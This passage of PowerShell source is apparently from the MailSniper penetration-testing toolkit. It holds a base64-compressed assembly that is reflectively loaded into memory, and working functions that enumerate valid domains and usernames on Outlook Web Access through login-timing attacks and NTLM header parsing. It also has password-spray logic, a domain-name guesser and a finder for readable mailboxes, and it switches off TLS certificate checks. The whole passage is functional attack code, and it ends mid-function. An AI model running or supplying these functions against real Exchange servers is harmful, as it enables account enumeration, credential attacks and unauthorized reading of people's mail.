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
'@
function LoadEWSDLL{
    $DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
    $UncompressedFileBytes = New-Object Byte[](1092608)
    $DeflatedStream.Read($UncompressedFileBytes, 0, 1092608) | Out-Null

    $asm = [Reflection.Assembly]::Load($UncompressedFileBytes)
}

function Invoke-DomainHarvestOWA {
<#
  .SYNOPSIS

    This module will attempt to connect to an Outlook Web Access portal and determine a valid domain name for logging into the portal.

    MailSniper Function: Invoke-DomainHarvestOWA
    Author: Brian Fehrman (@fullmetalcache) and Beau Bullock (@dafthack) (mostly a copy and paste of Beau's Invoke-PasswordSpray OWA function)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

        This module will attempt to harvest the domain name from an Outlook Web Access portal. The module uses an anomaly where invalid domain names with any username have a much shorter response time than valid domain names with invalid usernames. The module uses a username and password combination that is likely to be invalid for all accounts. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!

    .PARAMETER ExchHostname

        The hostname of the Exchange server to connect to.
 
    .PARAMETER OutFile

        Outputs the results to a text file.

    .PARAMETER DomainList

        List of potential domain names to check for validity (1 per line)

    .PARAMETER CompanyName
        
        Automatically generate and try potential domain names based upon a company name

    .PARAMETER Brute

        Causes Invoke-DomainHarvestOWA to attempt to perform a timing attack to determine the internal domain name.
  
  .EXAMPLE

    C:\PS> Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -DomainList .\domainlist.txt -OutFile potentially-valid-domains.txt -brute

    Description
    -----------
    This command will connect to the Outlook Web Access server at https://mail.domain.com/owa/ and attempt to harvest a list of valid domains by combining each potential domain name provided with an arbitrary username and password and write to a file called owa-valid-users.txt.

  
  .EXAMPLE

    C:\PS> Invoke-DomainHarvestOWA -ExchHostname mail.domain.com 

    Description
    -----------
    This command will connect to the Outlook Web Access server at https://mail.domain.com/autodiscover/Autodiscover.xml, and https://mail.domain.com/EWS/Exchange.asmx and attempt to enumerate the internal domain name based off of the WWW-Authenticate header response.

#>
  Param(


    [Parameter(Position = 0, Mandatory = $True)]
    [system.URI]
    $ExchHostname = "",

    [Parameter(Position = 1, Mandatory = $false)]
    [string]
    $OutFile = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $DomainList = "",

    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $CompanyName = "",

    [Parameter(Position = 4, Mandatory = $False)]
    [switch]
    $Brute

  )
    
    Write-Host -ForegroundColor "yellow" "[*] Harvesting domain name from the server at $ExchHostname"
    #Setting up URL's for later
    $OWAURL = ("https://" + $ExchHostname + "/owa/auth.owa")
    $OWAURL2 = ("https://" + $ExchHostname + "/owa/")
    $autodiscoverurl = ("https://" + $ExchHostname + "/autodiscover/autodiscover.xml")
    $ewsurl = ("https://" + $ExchHostname + "/EWS/Exchange.asmx")


    ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
    ## Code From http://poshcode.org/624

    ## Create a compilation environment
    $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
    $Compiler=$Provider.CreateCompiler()
    $Params=New-Object System.CodeDom.Compiler.CompilerParameters
    $Params.GenerateExecutable=$False
    $Params.GenerateInMemory=$True
    $Params.IncludeDebugInformation=$False
    $Params.ReferencedAssemblies.Add("System.DLL") > $null

    $TASource=@'
    namespace Local.ToolkitExtensions.Net.CertificatePolicy{
      public class TrustAll : System.Net.ICertificatePolicy {
        public TrustAll() { 
        }
        public bool CheckValidationResult(System.Net.ServicePoint sp,
          System.Security.Cryptography.X509Certificates.X509Certificate cert, 
          System.Net.WebRequest req, int problem) {
          return true;
        }
      }
    }
'@ 
    $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
    $TAAssembly=$TAResults.CompiledAssembly

    ## We now create an instance of the TrustAll and attach it to the ServicePointManager
    $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
    [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll


    ## end code from http://poshcode.org/624    
    
    if ($Brute)
    {
    $Domains = @()

    if ($DomainList -ne "") {
        $Domains += Get-Content $DomainList
    }
    elseif ($CompanyName -ne "") {
        
        #Generate a list of potential domain names based on spacing and mixed capitalization
        $Domains = Gen-Names -Name $CompanyName
    }
    else {
        Write-Output "You must provide either a DomainList or a CompanyName"
        return
    }

    #Generate random 10-character username and password
    #source: https://blogs.technet.microsoft.com/heyscriptingguy/2015/11/05/generate-random-letters-with-powershell/
    $Username = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
    $Password = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
    $sprayed = @()
    $domainlists = @{}
    $count = 0 


    $AvgTime = Get-BaseLineResponseTime -OWAURL $OWAURL -OWAURL2 $OWAURL2
    $Thresh = $AvgTime * 2.75

    $fullresults = @()

    Write-Host "Threshold: $Thresh"
    Write-Host ""
	Write-Host "Response Time (MS) `t Domain\Username"
    ForEach($Dom in $Domains)
    {
        #Logging into Outlook Web Access    
        #Setting POST parameters for the login to OWA
        $ProgressPreference = 'silentlycontinue'
        $POSTparams = @{destination="$OWAURL2";flags='4';forcedownlevel='0';username="$Dom\$Username";password="$Password";isUtf8='1'}

        #Primer Request
        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body $POSTparams -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 

        $Timer = [system.diagnostics.stopwatch]::startNew()
        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body $POSTparams -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
        $TimeTaken = [double]$Timer.ElapsedMilliseconds

		Write-Host "$TimeTaken `t`t`t $Dom\$username"

		if ($TimeTaken -ge $Thresh )
        {
            Write-Host -ForegroundColor "yellow" "[*] Potentialy Valid Domain! Domain:$Dom"
            $fullresults += $Dom
        }
    }

    Write-Host -ForegroundColor "yellow" ("[*] A total of " + $fullresults.count + " potentially valid domains found.")
    if ($OutFile -ne "") {
            $fullresults | Out-File -Encoding ascii $OutFile
            Write-Host "Results have been written to $OutFile."
    }
    }
    else
    {
    try 
    {
        $webrequest = Invoke-WebRequest -Uri $autodiscoverurl -Method Post -Headers @{"Authorization" = "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}
    }
    catch
    {
        $webrequest = $_.Exception.Response
        If ($webrequest.StatusCode -eq "Unauthorized")
        {
            $headers = $webrequest.Headers
            foreach ($headerkey in $headers)
            {
                if ($headerkey -like "WWW-Authenticate")
                {
                $wwwheader = $($headers[$headerkey]) -split ',|\s'
                $base64decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($wwwheader[1]))
                $commasep = $base64decoded -replace '[^\x21-\x39\x41-\x5A\x61-\x7A]+', ','
                $ntlmresparray = @()
                $ntlmresparray = $commasep -split ','
                Write-Host ("The domain appears to be: " + $ntlmresparray[7])
                }

            }
        }
        else
        {
            Write-Output "[*] Couldn't get domain from Autodiscover URL. Trying EWS URL..."
            try 
            {
                $webrequest = Invoke-WebRequest -Uri $ewsurl -Method Post -Headers @{"Authorization" = "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}
            }
            catch
            {
                $webrequest = $_.Exception.Response
                If ($webrequest.StatusCode -eq "Unauthorized")
                {
                    $headers = $webrequest.Headers
                    foreach ($headerkey in $headers)
                    {
                        if ($headerkey -like "WWW-Authenticate")
                        {
                        $wwwheader = $($headers[$headerkey]) -split ',|\s'
                        $base64decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($wwwheader[1]))
                        $commasep = $base64decoded -replace '[^\x21-\x39\x41-\x5A\x61-\x7A]+', ','
                        $ntlmresparray = @()
                        $ntlmresparray = $commasep -split ','
                        Write-Host ("The domain appears to be: " + $ntlmresparray[7])
                        }

                    }
                }
                else
                {
                Write-Output "[*] Couldn't get domain from EWS. Try the timing attack by specifying a list of possible domains and use the -brute option."
                Write-Output "Here is an example: Invoke-DomainHarvestOWA -ExchHostname $ExchHostname -DomainList .\domainlist.txt -OutFile potentially-valid-domains.txt -Brute"    
                }
            }
        }
    }

    }
}

function Invoke-UsernameHarvestOWA {
<#
  .SYNOPSIS

    This module will attempt to connect to an Outlook Web Access portal and harvest valid usernames. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!

    MailSniper Function: Invoke-UsernameHarvestOWA
    Author: Brian Fehrman (@fullmetalcache) and Beau Bullock (@dafthack) (mostly a copy and paste of Beau's Invoke-PasswordSpray OWA function)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

        This module will attempt to harvest useranmes from an Outlook Web Access portal. The module uses an anomaly where invalid usernames have a much greater response time than valid usernames, even if the password is invalid. The module uses a password that is likely to be invalid for all accounts. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!

    .PARAMETER ExchHostname

        The hostname of the Exchange server to connect to.
 
    .PARAMETER OutFile

        Outputs the results to a text file.

    .PARAMETER UserList

        List of usernames 1 per line to to attempt to check for validity.

    .PARAMETER Password

        A single password to attempt a password spray with.

    .PARAMETER Domain
       
        Domain name to prepend to usernames

    .PARAMETER Threads
       
        Number of password spraying threads to run.

  
  .EXAMPLE

    C:\PS> Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Threads 1 -OutFile owa-valid-users.txt

    Description
    -----------
    This command will connect to the Outlook Web Access server at https://mail.domain.com/owa/ and attempt to harvest a list of valid usernames by password spraying the provided list of usernames with a single password over 1 thread and write to a file called owa-valid-users.txt.

#>
  Param(


    [Parameter(Position = 0, Mandatory = $True)]
    [system.URI]
    $ExchHostname = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $OutFile = "",

    [Parameter(Position = 2, Mandatory = $True)]
    [string]
    $UserList = "",

    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $Password = "",
    
    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $Domain = "",
    
    [Parameter(Position = 5, Mandatory = $False)]
    [string]
    $Threads = "1"

  )
    
    Write-Host -ForegroundColor "yellow" "[*] Now spraying the OWA portal at https://$ExchHostname/owa/"
    #Setting up URL's for later
    $OWAURL = ("https://" + $ExchHostname + "/owa/auth.owa")
    $OWAURL2 = ("https://" + $ExchHostname + "/owa/")
    
    $Usernames = @()
    $Usernames += Get-Content $UserList
    $Users = @()
    $count = $Usernames.count

    #Gen a random password if one isnt given
    if ($Password -eq "") {
        $Password = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
    }


    ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
    ## Code From http://poshcode.org/624

    ## Create a compilation environment
    $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
    $Compiler=$Provider.CreateCompiler()
    $Params=New-Object System.CodeDom.Compiler.CompilerParameters
    $Params.GenerateExecutable=$False
    $Params.GenerateInMemory=$True
    $Params.IncludeDebugInformation=$False
    $Params.ReferencedAssemblies.Add("System.DLL") > $null

    $TASource=@'
    namespace Local.ToolkitExtensions.Net.CertificatePolicy{
      public class TrustAll : System.Net.ICertificatePolicy {
        public TrustAll() { 
        }
        public bool CheckValidationResult(System.Net.ServicePoint sp,
          System.Security.Cryptography.X509Certificates.X509Certificate cert, 
          System.Net.WebRequest req, int problem) {
          return true;
        }
      }
    }
'@ 
    $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
    $TAAssembly=$TAResults.CompiledAssembly

    ## We now create an instance of the TrustAll and attach it to the ServicePointManager
    $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
    [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll


    #This "primes" the username harvesting. First few names in the list can produce weird results, so use throwaways.
    for( $i = 0; $i -lt 5; $i++ ){
        $Users += -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
    }

    $Users += $Usernames

    $AvgTime = Get-BaseLineResponseTime -OWAURL $OWAURL -OWAURL2 $OWAURL2 -Domain $Domain
    $Thresh = $AvgTime * 0.6
    Write-Host "Threshold: $Thresh"

    $fullresults = @()

    ## end code from http://poshcode.org/624
	Write-Host "Response Time (MS) `t Domain\Username"
    ForEach($Username in $Users)
    {

        $CurrUser = $Domain + "\" + $Username
        #Logging into Outlook Web Access    
        #Setting POST parameters for the login to OWA
        $ProgressPreference = 'silentlycontinue'
        $POSTparams = @{destination="$OWAURL2";flags='4';forcedownlevel='0';username="$CurrUser";password="$Password";isUtf8='1'}

        $Timer = [system.diagnostics.stopwatch]::startNew()
        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body $POSTparams -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
        $TimeTaken = [double]$Timer.ElapsedMilliseconds

		Write-Host "$TimeTaken `t`t`t $CurrUser"
		if ($TimeTaken -le $Thresh)
        {
            Write-Host -ForegroundColor "yellow" "[*] Potentially Valid! User:$CurrUser"
            $fullresults += $CurrUser
        }
    }

    Write-Host -ForegroundColor "yellow" ("[*] A total of " + $fullresults.count + " potentially valid usernames found.")
    if ($OutFile -ne "")
       {
            $fullresults | Out-File -Encoding ascii $OutFile
            Write-Host "Results have been written to $OutFile."
       }
}


function Gen-Names {
<#
  .SYNOPSIS

    This module takes a string and attempts to generate various name combinations and acronyms based on the capitilzation and spacing in the string

    MailSniper Function: Gen-Names
    Author: Brian Fehrman (@fullmetalcache)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

        This module attempts to create a list of names and acronyms from a single string. The module looks for spacing and capitalization within the string as reference for how to generate variations of that string

    .PARAMETER Name

        The string to use as a seed for generating names
  
  .EXAMPLE

    C:\PS> Gen-Names "One Cool Company"

    Description
    -----------
    This command will split the string based on the spaces and will return and array that contains the following values:
    One
    OneCool
    OneCoolCompany
    OCC

#>
    Param(


    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Name = ""

    )

    Write-Host "Generating domain names..."

    $NameArray = @()

    #Investigate if the string has a mixture of upper and lower case characters
    $MixedCasing = ( ($Name.ToUpper() -ne $Name) -and ($Name.ToLower() -ne $Name) )

    #Check if the string has spaces
    $HasSpaces = $Name.Contains(" ")

    #Silently return an empty array if the string has no spaces or mixed casing
    if( (-not $MixedCasing) -and (-not $HasSpaces) ) {
        return @()
    }

    #insert spaces into the string and points where mixed casing occurs
    #(reference:https://social.technet.microsoft.com/Forums/office/en-US/2c042285-7dcb-4126-8ee2-a297a8b7de6f/split-strings-with-capital-letters-and-numbers?forum=winserverpowershell)
    if( $MixedCasing ) {
        $Name = $($Name.substring(0,1).toupper() + $Name.substring(1) -creplace '[A-Z]', ' $&').Trim()
    }

    #Tokenize the name based on spaces
    $NameTokens = $Name.Split(" ")

    #Generate acronym based on spaces in the name
    $Acronym = ""
    $NameTokens | ForEach {
        $Acronym += $_.Substring(0,1)
    }

    $NameArray += $Acronym
    $NameArray += $NameTokens[0]
    
    #Generate Combinations of the Name based on Spaces
    $NumTokens = $NameTokens.Length
    for($i=0; $i -lt ($NumTokens-1); $i++) {

        $NameCurr = $NameTokens[$i]

        for($j=$i+1; $j -lt $NumTokens; $j++) {
            $NameCurr += $NameTokens[$j]
            $NameArray += $NameCurr
        }
    }

    #List of suffixes to append
    $Suffix=@("com", "corp", "biz")

    #Iterate through the current list of potential domain names
    #Append each of the suffixes on to each of the potential domain names
    $DomSufs = @()
    ForEach($Name in $NameArray) {
        ForEach($Suf in $Suffix) {
            $DomSufs += $Name + "." + $Suf
        }
    }

    #Add the newly formed potential domain names to the current list
    $NameArray += $DomSufs

    $NameArray += "corp"
    $NameArray += "internal"

    Write-Host "Domains: $NameArray"
    Write-Host ""

    return $NameArray
}

function Get-BaseLineResponseTime {
<#
  .SYNOPSIS

    This module performs a series of invalid login attempts against an OWA portal in order to determine the baseline response time for invalid users or invalid domains

    MailSniper Function: Get-BaseLineResponseTime
    Author: Brian Fehrman (@fullmetalcache)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

       This module is used to help determine the average time taken for an OWA server to respond when it is given either an invalid domain with an invalid username or a valid domain with an invalid username.
       
       Note that there is a better method for obtaining the mail's internal domain name. This will be added in future versions. This and the timing attacks are detailed by Nate Power (http://securitypentest.com/).

    .PARAMETER OWAURL

        OWAURL for the portal (typicallyof the form  https://<mailserverurl>/owa/auth.owa)

    .PARAMETER OWAURL2
        OWAURL2 for the portal (typically of the form https://<mailserverurl>/owa/)

    .PARAMETER Domain
        Correct Domain name for the User/Environment (if previously obtained)

  
  .EXAMPLE

    C:\PS> Get-BaseLineResponseTime -OWAURL https://mail.company.com/owa/auth.owa -OWAURL2 https://mail.company.com/owa/

    Description
    -----------
    This command will get the baseline response time for when an invalid domain name is provided to the owa portal.

  .EXAMPLE

    C:\PS> Get-BaseLineResponseTime -OWAURL https://mail.company.com/owa/auth.owa -OWAURL2 https://mail.company.com/owa/ -Domain ValidInternalDomain

    Description
    -----------
    This command will get the baseline response time for when a valid domain name and an invalid username are provided to the owa portal

#>
    Param(


    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $OWAURL = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $OWAURL2 = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $Domain = ""

    )

    $Users = @()

    for($i = 0; $i -lt 5; $i++) {
        $UserCurr = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})

        if( $Domain -eq "" ) {
            $DRand = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
            $Users += $Drand + "\" + $UserCurr
        }
        else {
            $Users += $Domain + "\" + $UserCurr
        }
    }

    $Password = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})

    $AvgTime = 0.0
    $NumTries = 0.0

 ## end code from http://poshcode.org/624
    Write-Host "Determining baseline response time..."
	Write-Host "Response Time (MS) `t Domain\Username"
    ForEach($Username in $Users)
    {
        #Logging into Outlook Web Access    
        #Setting POST parameters for the login to OWA
        $ProgressPreference = 'silentlycontinue'
        $POSTparams = @{destination="$OWAURL2";flags='4';forcedownlevel='0';username="$Username";password="$Password";isUtf8='1'}
        
        #$Timer = [system.diagnostics.stopwatch]::startNew()
        
        #Primer Call
        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body $POSTparams -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
        
        #$TimeTaken = [double]$Timer.ElapsedMilliseconds
		#Write-Host "$TimeTaken `t $username"

        $Timer = [system.diagnostics.stopwatch]::startNew()
        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body $POSTparams -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
        $TimeTaken = [double]$Timer.ElapsedMilliseconds
		Write-Host "$TimeTaken `t`t`t $username"
        
        #Throw away first three values, as they can sometimes be garbage
        $NumTries += 1.0
        $AvgTime += $TimeTaken
    }


    $AvgTime /= $NumTries

    Write-Host ""
    Write-Host "`t Baseline Response: $AvgTime"
    Write-Host ""

    return $AvgTime
}

function Invoke-OpenInboxFinder{

<#
  .SYNOPSIS

    This module will connect to a Microsoft Exchange server using Exchange Web Services and check mailboxes to determine if the current user has permissions to access them.

    MailSniper Function: Invoke-OpenInboxFinder
    Author: Beau Bullock (@dafthack)
    License: MIT
    Required Dependencies: None
    Optional Dependencies: None

  .DESCRIPTION

    This module will connect to a Microsoft Exchange server using Exchange Web Services and check mailboxes to determine if the current user has permissions to access them.

  .PARAMETER ExchHostname

    The hostname of the Exchange server to connect to.

  .PARAMETER Mailbox

    Email address of a single user to check permissions on.

  .PARAMETER ExchangeVersion

    In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified. By default this script tries "Exchange2010". Additional options to try are  Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1.
  
  .PARAMETER OutFile

    Outputs the results of the search to a file.

  .PARAMETER EmailList

    List of email addresses one per line to check permissions on.

  .PARAMETER AllPerms

  Returns all of the permission items on an object

  .PARAMETER Remote

  Will prompt for credentials for use with connecting to a remote server such as Office365 or an externally facing Exchange server.

  .EXAMPLE

    C:\PS> Invoke-OpenInboxFinder -EmailList email-list.txt

    Description
    -----------
    This command will check if the current user running the PowerShell session has access to each Inbox of the email addresses in the EmailList file.

  .EXAMPLE

    C:\PS> Invoke-OpenInboxFinder -EmailList email-list.txt -ExchHostname outlook.office365.com -Remote

    Description
    -----------
    This command will prompt for credentials and then connect to Exchange Web Services on outlook.office365.com to check each mailbox permission. 

#>
  Param(

    [Parameter(Position = 0, Mandatory = $False)]
    [string]
    $Mailbox = "",

    [Parameter(Position = 1, Mandatory = $False)]
    [system.URI]
    $ExchHostname = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $OutFile = "",

    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $ExchangeVersion = "Exchange2010",

    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $EmailList = "",

    [Parameter(Position = 5, Mandatory = $False)]
    [switch]
    $AllPerms,

    [Parameter(Position = 6, Mandatory = $False)]
    [switch]
    $Remote 

  )
  
  #Running the LoadEWSDLL function to load the required Exchange Web Services dll
  LoadEWSDLL
  
  $ErrorActionPreference = 'silentlycontinue' 
  $Mailboxes = @()

  If ($EmailList -ne "") 
  {
    $Mailboxes = Get-Content -Path $EmailList
    $Mailbox = $Mailboxes[0]
  } 
  elseif ($Mailbox -ne "")
  {
    $Mailboxes = $Mailbox
  }

  Write-Output "[*] Trying Exchange version $ExchangeVersion"
  $ServiceExchangeVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion
  $service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($ServiceExchangeVersion)
 
  #If the -Remote flag was passed prompt for the user's domain credentials.
  if ($Remote)
  {
    $remotecred = Get-Credential
    $service.UseDefaultCredentials = $false
    $service.Credentials = $remotecred.GetNetworkCredential()
  }
  else
  {
    #Using current user's credentials to connect to EWS
    $service.UseDefaultCredentials = $true
  }

  ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
  ## Code From http://poshcode.org/624

  ## Create a compilation environment
  $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
  $Compiler=$Provider.CreateCompiler()
  $Params=New-Object System.CodeDom.Compiler.CompilerParameters
  $Params.GenerateExecutable=$False
  $Params.GenerateInMemory=$True
  $Params.IncludeDebugInformation=$False
  $Params.ReferencedAssemblies.Add("System.DLL") > $null

  $TASource=@'
    namespace Local.ToolkitExtensions.Net.CertificatePolicy{
      public class TrustAll : System.Net.ICertificatePolicy {
        public TrustAll() { 
        }
        public bool CheckValidationResult(System.Net.ServicePoint sp,
          System.Security.Cryptography.X509Certificates.X509Certificate cert, 
          System.Net.WebRequest req, int problem) {
          return true;
        }
      }
    }
'@ 
  $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
  $TAAssembly=$TAResults.CompiledAssembly

  ## We now create an instance of the TrustAll and attach it to the ServicePointManager
  $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
  [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll

  ## end code from http://poshcode.org/624
  

  
  if ($ExchHostname -ne "")
  {
    ("[*] Using EWS URL " + "https://" + $ExchHostname + "/EWS/Exchange.asmx")
    $service.Url = new-object System.Uri(("https://" + $ExchHostname + "/EWS/Exchange.asmx"))
  }
  else
  {
